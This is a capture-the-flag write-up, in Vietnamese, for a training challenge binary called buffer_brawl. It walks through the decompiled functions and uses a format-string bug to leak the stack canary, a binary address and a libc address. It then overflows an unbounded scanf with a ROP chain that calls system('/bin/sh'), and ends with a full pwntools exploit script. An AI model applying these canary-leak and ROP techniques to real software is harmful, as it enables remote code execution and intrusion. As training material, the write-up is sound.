---
title: 'KCSC Trainee Task 4: TRAINING CHALLENGE'

---

# KCSC Trainee Task 4: TRAINING CHALLENGE
![{01F42B36-E8D6-4286-8E09-FD06D7103444}](https://hackmd.io/_uploads/SyDsKYNikl.png)

## IDA
- Ta phân tích hàm main():
```c=
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  banner();
  setup();
  welcome();
  menu();
}
```
> Hàm banner() được gọi để in ra hình ảnh logo của chương trình, hàm setup() để thiết lập các bộ nhớ đệm, welcome() để in ra lời mời chào và menu() để vào chương trình chính.
- Hàm menu():
```c=
void __noreturn menu()
{
  int choice; // [rsp+14h] [rbp-44h] BYREF
  unsigned __int64 v1; // [rsp+18h] [rbp-40h]

  v1 = __readfsqword(0x28u);
  while ( 1 )
  {
    puts("");
    puts("Choose:");
    puts("1. Throw a jab");
    puts("2. Throw a hook");
    puts("3. Throw an uppercut");
    puts("4. Slip");
    puts("5. Call off");
    printf("> ");
    __isoc99_scanf("%d", &choice);
    switch ( choice )
    {
      case 1:
        jab();
        break;
      case 2:
        hook();
        break;
      case 3:
        uppercut();
        break;
      case 4:
        slip();                                 // fmtstr
        break;
      case 5:
        TKO();
      default:
        puts("Invalid choice. Try again.");
        break;
    }
  }
}
```
> Hàm in ra menu của chương trình với 5 lựa chọn và cho phép ta nhập vào số tương ứng với lựa chọn và ứng với mỗi lựa chọn các hàm khác nhau sẽ được gọi.
> Với hàm jab(), hook(), uppercut() sẽ có cấu trúc tương tự:
```c=
__int64 jab()
{
  puts("\nYou threw a jab! -1 to the stack's life points.");
  --stack_life_points;
  return stack_check_up();
}
```
> Với jab thì biến stack_life_point bị trừ đi 1 và tương tự với hook() và uppercut() thì sẽ bị trừ đi lần lượt là 2 và 3. Hàm sẽ trả về hàm stack_check_up().
- Stack_check_up()
```c=
int stack_check_up()
{
  __int64 v0; // rax
  __int64 v2; // [rsp+0h] [rbp-28h] BYREF
  unsigned __int64 v3; // [rsp+18h] [rbp-10h]

  v3 = __readfsqword(0x28u);
  if ( stack_life_points == 13 )
  {
    puts("\nThe stack got dizzy! Now it's your time to win!");
    puts("Enter your move: ");
    __isoc99_scanf("%s", &v2);
    return v3 - __readfsqword(0x28u);
  }
  else
  {
    if ( stack_life_points <= 0 )
    {
      puts("\nStack fainted! You're too brutal for it!");
      exit(0);
    }
    LODWORD(v0) = printf("\nStack's life points: %d\n", stack_life_points);
  }
  return v0;
}
```
> Hàm tiến hành kiểm tra nếu stack_life_point = 13 thì cho phép ta nhập dữ liệu là bước đi vào biến v2 sau đó trả về giá trị của việc kiểm tra tính toàn vẹn của canary hoặc nếu stack_life_point bé hơn 0 thì thực hiện thoát chương trình.
- Hàm slip():
```c=
unsigned __int64 slip()
{
  char v1[40]; // [rsp+0h] [rbp-38h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-10h]

  v2 = __readfsqword(0x28u);
  puts("\nTry to slip...\nRight or left?");
  read(0, v1, 29uLL);
  printf(v1);                                   // format string here
  return v2 - __readfsqword(0x28u);
}
```
> Hàm cho phép ta nhập vào biến v1 các bước đi (trái/phải) với kích thước 29 byte và in ra v1. Sau đó kết thúc hàm bằng việc kiểm tra tính toàn vẹn của canary.

## Ý TƯỞNG
- Ta nhận thấy tồn tại lỗi Format String tại hàm slip() và ta có thể dùng bug đó để leak địa chỉ, canary hoặc ghi đè địa chỉ. Ngoài ra tại hàm stack_check_up cũng có thể dùng để khai thác vì sử dụng scanf(lấy dữ liệu đến khi gặp kí tự xuống dòng hoặc tab) và với việc leak được canary thì ta hoàn toàn có thể bypass để ghi đè địa chỉ trả về của hàm. 
- Vì không tồn tại một hàm nào có thể tạo shell vậy ta hướng đến việc tạo một ROPchain system("/bin/sh") để lấy được shell.

## KHAI THÁC
- Checksec:
![{40D2EB73-13BC-4E1A-BEB9-C21721EE57AF}](https://hackmd.io/_uploads/HyvzmqEjkx.png)
> Các phương pháp bảo mật như: RELRO, Canary, NX, PIE đều được bật.
- Leak address:
> Dừng tại lúc slip() lấy dữ liệu đầu vào để khảo sát stack:
> ![{BF89608D-667A-4843-A55F-B654B15D7217}](https://hackmd.io/_uploads/HkaQEcEsJg.png)
> Ta thấy rằng với FormatString ta hoàn toàn có thể leak được các địa chỉ của binary, libc và cả canary tại đây với %p với index thích hợp. Ta có script:
>```python=
> #Leak address by using choice 4 exsist format string bug
> sla(b'> ',b'4')
> sla(b'left?\n',f'%13$p%29$p%17$p'.encode())
> data =rl().split(b'0x')
> exe_leak = int(data[1],16)
> libc_leak = int(data[2],16)
> can = int(data[3],16)
> 
> exe.address = exe_leak - 0x1747
> info('Exe leak: ' + hex(exe_leak))
> info('Exe base: ' + hex(exe.address))
> libc.address = libc_leak - 0x28150
> info('Libc leak: ' + hex(libc_leak))
> info('Libc base: ' + hex(libc.address))
> info('Canary leak: '+ hex(can))
> ```
> Chạy script và kiểm tra liệu các giá trị được leak ra có hợp lệ:
> ![{A2BE521D-5934-44E9-9060-FD367CA7C0B1}](https://hackmd.io/_uploads/rJPXScVjkx.png)
> Vậy tất cả các giá trị và địa chỉ cần thiết đều được tính toán đúng.
- Cooking shell
> Với ý tưởng đã nêu, ta sẽ sử dụng hàm stack_check_up với điều kiện stack_life_point = 13 để ta có thể thực thi shell. Vậy trước hết ta cần nhập vào chương trình một lượng tùy chọn trừ điểm hợp lý để stack_life_point = 13 để việc nhập dữ liệu có thể được diễn ra: (100-13)/3=29. Vậy lựa chọn tối ưu nhất là lựa chọn 3 29 lần.
> Sau đó ta sẽ tiến hành khảo sát stack để nhập liệu hợp lý:
> ![{FC5EB094-5CC7-4FD4-9150-80D00F8B8337}](https://hackmd.io/_uploads/SJZpU9Voyl.png)
> Ta có thể xác định nhanh chóng địa chỉ saved rip của hàm nằm tại rsp + 0x28 và trước đó tại rsp + 0x18 là canary.
> Vậy ý tưởng ở đây là ta sẽ cho nhập vào 0x18 byte random và kế tiếp là giá trị của canary, sau đó là 8 byte bất kì cho rbp và địa chỉ của các gadget để lấy shell. (ở đây ta sử dụng ret; pop rdi; "/bin/sh"; libc.system). Ta có script:
> ```python=
> # Cooking shell
> # payload = p64(ret) + p64(prdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(libc.sym.system)
> prdi = libc.address + 0x28795
> ret = libc.address + 0x0000000000026a3e
> payload = b'a'*24 + p64(can) + b'a'*8 + p64(ret) + p64(prdi) + p64(next(libc.search(b'/bin/sh\0'))) + p64(libc.sym.system)
> for i in range(29):
>     sla(b'> ',b'3')
> sla(b'move: \n',payload)
> ```
> Ta cho chạy thử script:
> ![{9E5567D7-3F69-4FE5-BBD3-AD6BC0B3209B}](https://hackmd.io/_uploads/B1afdc4sye.png)
> Vậy ta đã lấy được shell.

=> **Challenge hoàn thành**

## FULLSCRIPT
```python=
#!/usr/bin/env python3

from pwn import *

exe = ELF('buffer_brawl_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
r = lambda nbytes: p.recv(nbytes)
ru = lambda data: p.recvuntil(data)
rl = lambda : p.recvline()
ra = lambda : p.recvall()
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*menu+172
        b*slip+41
        b*slip+51
        b*stack_check_up+132

        c
        ''')
        input()


if args.REMOTE:
    p = remote('')
else:
    p = process([exe.path])
GDB()

#Leak address by using choice 4 exsist format string bug
sla(b'> ',b'4')
sla(b'left?\n',f'%13$p%29$p%17$p'.encode())
data =rl().split(b'0x')
exe_leak = int(data[1],16)
libc_leak = int(data[2],16)
can = int(data[3],16)

exe.address = exe_leak - 0x1747
info('Exe leak: ' + hex(exe_leak))
info('Exe base: ' + hex(exe.address))
libc.address = libc_leak - 0x28150
info('Libc leak: ' + hex(libc_leak))
info('Libc base: ' + hex(libc.address))
info('Canary leak: '+ hex(can))

# Cooking shell
# payload = p64(ret) + p64(prdi) + p64(next(libc.search(b"/bin/sh\0"))) + p64(libc.sym.system)
prdi = libc.address + 0x28795
ret = libc.address + 0x0000000000026a3e
payload = b'a'*24 + p64(can) + b'a'*8 + p64(ret) + p64(prdi) + p64(next(libc.search(b'/bin/sh\0'))) + p64(libc.sym.system)
for i in range(29):
    sla(b'> ',b'3')
sla(b'move: \n',payload)

p.interactive()
```